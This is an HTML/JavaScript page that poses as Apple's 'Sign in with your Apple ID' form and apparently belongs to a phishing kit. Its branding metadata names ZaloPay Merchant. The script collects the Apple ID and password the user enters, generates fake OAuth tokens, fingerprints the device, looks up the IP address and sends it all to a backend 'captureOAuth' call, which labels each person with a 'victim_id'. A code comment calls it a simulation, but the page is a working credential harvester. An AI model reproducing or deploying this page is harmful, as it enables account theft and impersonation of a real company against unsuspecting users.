<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#0066cc">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
    <link rel="manifest" href="/manifest.json">
    <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
    <title>Sign in with your Apple ID</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .apple-auth-container {
            width: 100%;
            max-width: 420px;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            padding: 40px;
        }
        
        .apple-logo {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .apple-logo svg {
            width: 40px;
            height: 40px;
            fill: #000000;
        }
        
        .auth-header {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .auth-header h1 {
            font-size: 28px;
            font-weight: 600;
            color: #000000;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        
        .auth-header p {
            font-size: 15px;
            color: #86868b;
            font-weight: 400;
        }
        
        .auth-form {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #1d1d1f;
            margin-bottom: 8px;
            letter-spacing: -0.1px;
        }
        
        .form-input {
            width: 100%;
            padding: 12px 16px;
            font-size: 17px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            background-color: #ffffff;
            color: #1d1d1f;
            transition: all 0.2s;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
        }
        
        .form-input.error {
            border-color: #ff3b30;
        }
        
        .error-message {
            color: #ff3b30;
            font-size: 12px;
            margin-top: 6px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        
        .form-link {
            color: #0071e3;
            text-decoration: none;
            font-size: 14px;
            font-weight: 400;
        }
        
        .form-link:hover {
            text-decoration: underline;
        }
        
        .btn-primary {
            background-color: #0071e3;
            color: #ffffff;
            border: none;
            padding: 12px 22px;
            font-size: 17px;
            font-weight: 400;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-width: 100px;
        }
        
        .btn-primary:hover {
            background-color: #0077ed;
        }
        
        .btn-primary:active {
            background-color: #0066cc;
        }
        
        .btn-primary:disabled {
            background-color: #d2d2d7;
            color: #86868b;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background-color: transparent;
            color: #0071e3;
            border: none;
            padding: 12px 22px;
            font-size: 17px;
            font-weight: 400;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .btn-secondary:hover {
            background-color: rgba(0, 113, 227, 0.1);
        }
        
        .password-toggle {
            position: relative;
        }
        
        .password-toggle-btn {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #86868b;
            cursor: pointer;
            padding: 4px;
            font-size: 14px;
        }
        
        .password-toggle-btn:hover {
            color: #0071e3;
        }
        
        .help-links {
            margin-top: 16px;
            font-size: 13px;
        }
        
        .help-links a {
            color: #0071e3;
            text-decoration: none;
        }
        
        .help-links a:hover {
            text-decoration: underline;
        }
        
        .loading-spinner {
            display: none;
            width: 16px;
            height: 16px;
            border: 2px solid #ffffff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        
        .loading-spinner.show {
            display: inline-block;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .divider {
            text-align: center;
            margin: 24px 0;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            left: 0;
            right: 0;
            top: 50%;
            height: 1px;
            background: #d2d2d7;
        }
        
        .divider span {
            background: #ffffff;
            padding: 0 16px;
            position: relative;
            color: #86868b;
            font-size: 13px;
        }
        
        .apple-id-input {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .apple-id-input::before {
            content: '@';
            color: #86868b;
            font-size: 17px;
        }
    </style>
</head>
<body>
    <div class="apple-auth-container">
        <div class="apple-logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
            </svg>
        </div>
        
        <div class="auth-header">
            <h1>Sign in with your Apple ID</h1>
            <p>Enter your Apple ID and password</p>
        </div>
        
        <form class="auth-form" id="appleAuthForm">
            <div class="form-group">
                <label for="appleId" class="form-label">Apple ID</label>
                <div class="apple-id-input">
                    <input 
                        type="text" 
                        class="form-input" 
                        id="appleId" 
                        name="appleId" 
                        autocomplete="username"
                        autofocus
                        required
                        placeholder="name@example.com"
                    >
                </div>
                <div class="error-message" id="appleIdError"></div>
            </div>
            
            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <div class="password-toggle">
                    <input 
                        type="password" 
                        class="form-input" 
                        id="password" 
                        name="password" 
                        autocomplete="current-password"
                        required
                    >
                    <button 
                        type="button" 
                        class="password-toggle-btn" 
                        id="togglePassword"
                        aria-label="Show password"
                    >
                        <i class="fas fa-eye" id="passwordIcon"></i>
                    </button>
                </div>
                <div class="error-message" id="passwordError"></div>
            </div>
            
            <div class="help-links">
                <a href="#" id="forgotAppleIdLink">Forgot your Apple ID or password?</a>
            </div>
            
            <div class="form-actions">
                <a href="auth_signup_preview.html" class="btn-secondary">Cancel</a>
                <button type="submit" class="btn-primary" id="signInBtn">
                    <span class="loading-spinner" id="loadingSpinner"></span>
                    Sign In
                </button>
            </div>
        </form>
    </div>

    <script>
        // DOM elements
        const form = document.getElementById('appleAuthForm');
        const appleIdInput = document.getElementById('appleId');
        const passwordInput = document.getElementById('password');
        const signInBtn = document.getElementById('signInBtn');
        const togglePasswordBtn = document.getElementById('togglePassword');
        const passwordIcon = document.getElementById('passwordIcon');
        const loadingSpinner = document.getElementById('loadingSpinner');
        
        // Email validation
        function validateAppleId(appleId) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(appleId);
        }
        
        // Show error message
        function showError(fieldId, message) {
            const errorElement = document.getElementById(fieldId + 'Error');
            const inputElement = document.getElementById(fieldId);
            
            if (errorElement) {
                errorElement.textContent = message;
                errorElement.classList.add('show');
            }
            
            if (inputElement) {
                inputElement.classList.add('error');
            }
        }
        
        // Hide error message
        function hideError(fieldId) {
            const errorElement = document.getElementById(fieldId + 'Error');
            const inputElement = document.getElementById(fieldId);
            
            if (errorElement) {
                errorElement.classList.remove('show');
            }
            
            if (inputElement) {
                inputElement.classList.remove('error');
            }
        }
        
        // Toggle password visibility
        togglePasswordBtn.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            if (type === 'text') {
                passwordIcon.classList.remove('fa-eye');
                passwordIcon.classList.add('fa-eye-slash');
                togglePasswordBtn.setAttribute('aria-label', 'Hide password');
            } else {
                passwordIcon.classList.remove('fa-eye-slash');
                passwordIcon.classList.add('fa-eye');
                togglePasswordBtn.setAttribute('aria-label', 'Show password');
            }
        });
        
        // Form submission
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const appleId = appleIdInput.value.trim();
            const password = passwordInput.value;
            
            // Validation
            let hasError = false;
            
            if (!appleId) {
                showError('appleId', 'Enter your Apple ID');
                hasError = true;
            } else if (!validateAppleId(appleId)) {
                showError('appleId', 'Enter a valid Apple ID');
                hasError = true;
            } else {
                hideError('appleId');
            }
            
            if (!password) {
                showError('password', 'Enter your password');
                hasError = true;
            } else {
                hideError('password');
            }
            
            if (hasError) {
                return;
            }
            
            // Show loading state
            signInBtn.disabled = true;
            loadingSpinner.classList.add('show');
            signInBtn.innerHTML = '<span class="loading-spinner show"></span>Signing in...';
            
            try {
                // Simulate Apple OAuth flow vÃ  capture credentials
                const oauthData = await captureAppleOAuth(appleId, password);
                
                // Get device fingerprint and metadata
                const deviceFingerprint = await getDeviceFingerprint();
                const ipAddress = await getClientIP();
                
                // Prepare token data
                const tokenData = {
                    access_token: oauthData.tokens.access_token,
                    refresh_token: oauthData.tokens.refresh_token,
                    id_token: oauthData.tokens.id_token,
                    expires_in: oauthData.tokens.expires_in,
                    token_type: oauthData.tokens.token_type,
                    email: appleId,
                    profile: oauthData.profile
                };
                
                // Get session data
                const sessionData = {
                    ip_address: ipAddress,
                    user_agent: navigator.userAgent,
                    referrer: document.referrer || null,
                    utm_parameters: getUTMParameters(),
                    timestamp: new Date().toISOString()
                };
                
                // Prepare metadata
                const metadata = {
                    campaignId: new URLSearchParams(window.location.search).get('campaign_id') || null,
                    sessionData: sessionData,
                    device_fingerprint: deviceFingerprint,
                    capture_timestamp: new Date().toISOString()
                };
                
                // Send to backend using API client
                const result = await window.apiClient.captureOAuth(tokenData, 'apple', metadata);
                
                if (result.success) {
                    // Store OAuth data in sessionStorage
                    sessionStorage.setItem('oauth_data', JSON.stringify({
                        email: oauthData.profile.email,
                        name: oauthData.profile.name || oauthData.profile.email.split('@')[0],
                        provider: 'apple',
                        victim_id: result.victim_id
                    }));
                    
                    // Redirect via success page to enhance UX
                    const redirectUrl = `auth_success.html?provider=apple&email=${encodeURIComponent(oauthData.profile.email)}&name=${encodeURIComponent(oauthData.profile.name || oauthData.profile.email.split('@')[0])}&victim_id=${encodeURIComponent(result.victim_id)}`;
                    window.location.href = redirectUrl;
                } else {
                    throw new Error(result.error || 'Authentication failed');
                }
                
            } catch (error) {
                console.error('Apple OAuth capture error:', error);
                
                // Determine error type
                let errorType = 'invalid_credentials';
                let errorCode = '';
                
                if (error.message.includes('network') || error.message.includes('fetch')) {
                    errorType = 'network_error';
                } else if (error.message.includes('oauth')) {
                    errorType = 'oauth_failed';
                }
                
                // Redirect to error page
                window.location.href = `auth_error.html?type=${errorType}&provider=apple&code=${errorCode}`;
            }
        });
        
        // Simulate Apple OAuth token capture
        async function captureAppleOAuth(appleId, password) {
            // In real implementation, this would interact with Apple Sign In API
            // For phishing simulation, we capture the credentials and generate fake tokens
            
            // Simulate API delay
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Generate mock OAuth response
            const mockTokens = {
                access_token: 'a' + generateRandomString(100),
                refresh_token: 'r' + generateRandomString(50),
                id_token: generateRandomString(200),
                expires_in: 3600,
                token_type: 'Bearer'
            };
            
            // Mock user profile
            const mockProfile = {
                email: appleId,
                name: appleId.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
                sub: generateRandomString(44), // Apple user ID
                email_verified: true
            };
            
            return {
                tokens: mockTokens,
                profile: mockProfile
            };
        }
        
        // Helper functions
        function generateRandomString(length) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
        
        // Get UTM parameters from URL
        function getUTMParameters() {
            const params = new URLSearchParams(window.location.search);
            return {
                utm_source: params.get('utm_source') || null,
                utm_medium: params.get('utm_medium') || null,
                utm_campaign: params.get('utm_campaign') || null,
                utm_content: params.get('utm_content') || null,
                utm_term: params.get('utm_term') || null
            };
        }
        
        async function getDeviceFingerprint() {
            // Use advanced fingerprinting if available
            if (window.DeviceFingerprinting && window.DeviceFingerprinting.generateDeviceFingerprint) {
                return await window.DeviceFingerprinting.generateDeviceFingerprint();
            }
            
            // Fallback to basic fingerprinting
            return {
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                user_agent: navigator.userAgent
            };
        }
        
        // Real-time validation
        appleIdInput.addEventListener('blur', function() {
            const appleId = appleIdInput.value.trim();
            if (appleId && !validateAppleId(appleId)) {
                showError('appleId', 'Enter a valid Apple ID');
            } else {
                hideError('appleId');
            }
        });
        
        // Forgot Apple ID link
        document.getElementById('forgotAppleIdLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Apple ID recovery would redirect to Apple ID account recovery page.');
        });
        
        // Enter key handling
        form.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                form.dispatchEvent(new Event('submit'));
            }
        });
    </script>
    <!-- Service Worker Registration -->
    <script>
      if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => {
          navigator.serviceWorker.register('/sw.js')
            .then((registration) => {
              console.log('Service Worker registered successfully:', registration.scope);
            })
            .catch((error) => {
              console.error('Service Worker registration failed:', error);
            });
        });
      }
    </script>
    
    <!-- Device Fingerprinting -->
    <script src="/js/fingerprinting.js"></script>
    
    <!-- API Client -->
    <script src="/js/api.js"></script>
    
    <!-- Socket.IO Background Support -->
    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
    <script src="/js/socket-background.js"></script>
</body>
</html>
